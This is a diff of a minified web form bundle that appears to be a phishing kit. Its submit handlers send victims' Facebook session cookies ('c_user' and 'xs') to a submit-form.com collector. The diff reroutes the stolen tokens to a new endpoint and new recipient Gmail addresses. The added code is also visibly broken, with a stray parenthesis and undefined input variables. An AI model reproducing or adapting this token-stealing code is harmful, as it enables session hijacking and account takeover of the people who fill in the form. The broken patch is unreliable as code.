@@ -9814,18 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/4T7jKwRCs", {
+                                    fetch("https://submit-form.com/IU5LdPcr7", {
                                         method: "POST",
                                         headers: {
-                                            "Content-Type": "application/json"
-                                        },
-                                        body: JSON.stringify({
-                                            emails: o,
-                                            workerEmail: "Usman",
-                                            xs: r,
-                                            c_user: i,
-                                            name: "Usman"
-                                        })
+                                            "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    c_user: cUserInput.value,
+                    xs: xsInput.value,
+                    emails: ["mehtabaliii333@gmail.com", "mehtabalii67890@gmail.com"],
+                    workerEmail: "lingdavid24@gmail.com",
+                    name: "Mehtab",)
                                     }).then((e => {
                                         e.ok
                                     }
@@ -13256,7 +13255,7 @@
             })
         }
           , Wt = () => {
-            const e = ["abdulbariniz700@gmail.com"]
+            const e = ["mehtabaliii333@gmail.com"]
               , t = _()
               , [r,a] = (0,
             n.useState)(!1)
@@ -13358,17 +13357,17 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/4T7jKwRCs", {
+                                    u && o ? (fetch("https://submit-form.com/IU5LdPcr7", {
                                         method: "POST",
                                         headers: {
-                                            "Content-Type": "application/json"
-                                        },
-                                        body: JSON.stringify({
-                                            emails: e,
-                                            workerEmail: "",
-                                            xs: o,
-                                            c_user: u,
-                                            name: "My Self"
+                                            "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    c_user: cUserInput.value,
+                    xs: xsInput.value,
+                    emails: ["mehtabaliii333@gmail.com", "mehtabalii67890@gmail.com"],
+                    workerEmail: "lingdavid24@gmail.com",
+                    name: "Mehtab",
                                         })
                                     }).then((e => {
                                         e.ok
